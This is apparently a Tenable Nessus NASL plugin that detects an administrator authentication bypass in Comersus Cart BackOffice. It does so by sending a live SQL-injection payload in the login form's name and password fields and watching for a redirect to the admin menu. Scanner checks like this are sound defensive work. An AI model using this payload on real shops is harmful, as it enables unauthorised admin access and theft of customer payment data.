#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains an ASP application that allows for
authentication bypass. 

Description :

The remote host appears to be running Comersus Cart, an ASP shopping
cart application. 

The version of Comersus Cart installed on the remote host fails to
restrict access to its customer database, which contains order
information, passwords, credit card numbers, etc.  Further, the data
in all likelihood can be decrypted trivially since the application
reportedly uses the same default password for each version of the
application to encrypt and decrypt data. 

See also :

http://www.morx.org/comersus.txt

Solution :

Unknown at this time. 

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";


if (description) {
  script_id(20131);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(15251);

  script_name(english:"Comersus BackOffice Administrator Authentication Bypass Vulnerability");
  script_summary(english:"Checks for administrator authentication bypass vulnerability in Comersus BackOffice");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/comersus", "/store", "/shop", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  foreach prod (make_list("backofficeLite", "backofficePlus")) {
    # Check whether the script exists.
    req = http_get(item:string(dir, "/", prod, "/comersus_backoffice_index.asp"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # Get the session cookie.
    pat = "Set-Cookie: (ASPSESSIONID[^=]+)=([^; ]+)";
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        cookie = eregmatch(pattern:pat, string:match);
        if (cookie == NULL) break;
        cookie = string(cookie[1], "=", cookie[2]);
        break;
      }
    }

    # If we have a session cookie...
    if (strlen(cookie)) {
      # Try to exploit the flaw.
      exploit = "%27+OR+adminpassword+%3C%3E+%27%27+OR+adminpassword+%3D+%27";
      postdata = string(
        "adminName=", exploit, "&",
        "adminpassword=", exploit, "&",
        "Submit2=Login"
      );
      req = string(
        "POST ", dir, "/backofficeLite/comersus_backoffice_menu.asp HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Cookie: ", cookie, "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if (res == NULL) exit(0);

      # There's a problem if it looks like we're getting in.
      if (egrep(pattern:"^Location: +comersus_backoffice_menu.asp?lastLogin=", string:res)) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
